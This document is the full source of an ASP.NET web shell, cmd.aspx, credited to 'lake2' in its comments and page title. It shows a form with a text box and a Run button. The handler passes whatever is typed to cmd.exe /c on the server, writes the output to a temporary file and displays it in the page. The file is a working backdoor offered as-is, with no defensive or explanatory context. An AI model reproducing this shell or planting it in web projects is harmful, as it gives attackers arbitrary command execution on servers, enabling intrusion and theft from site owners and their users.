   <%@ Page Language="VB" Debug="true" %>
   <%@ Import Namespace="system.IO" %>
   <script runat="server">
   'cmd.aspx¡ª¡ªasp.net shell by lake2
   'My E-mail:mrhupo.126.com
   'http://mrhupo.126.com
   sub runcmd(Src As Object, E As EventArgs)
       dim but as string
       dim tempfile as string=server.MapPath(".") & "\" & "test.txt"
       shell("cmd.exe /c " & cmd.text & " > " & tempfile,,true,20000)
       dim myread as new streamreader(tempfile,encoding.default)
       but=replace(myread.readtoend,vbcrlf,"<br>")
       but=replace(but," ","&nbsp;")
       result.text=but
       myread.close
       file.exists(tempfile)
       file.delete(tempfile)
       cmd.text=""
   end sub
   </script>
   <html>
   <head>
   <meta http-equiv="Content-Type" content="text/html; charset=gb2312">
   <title>ASP.NET Shell by lake2</title>
   </head>
   <body>
   <form runat="server">
     <asp:TextBox ID="cmd" runat="server" />
     <asp:Button ID="Button" runat="server" Text="Run" OnClick="runcmd" />
     <p>
       <asp:Label ID="result" runat="server" />      </p>
   </form>
   </body>
   </html>
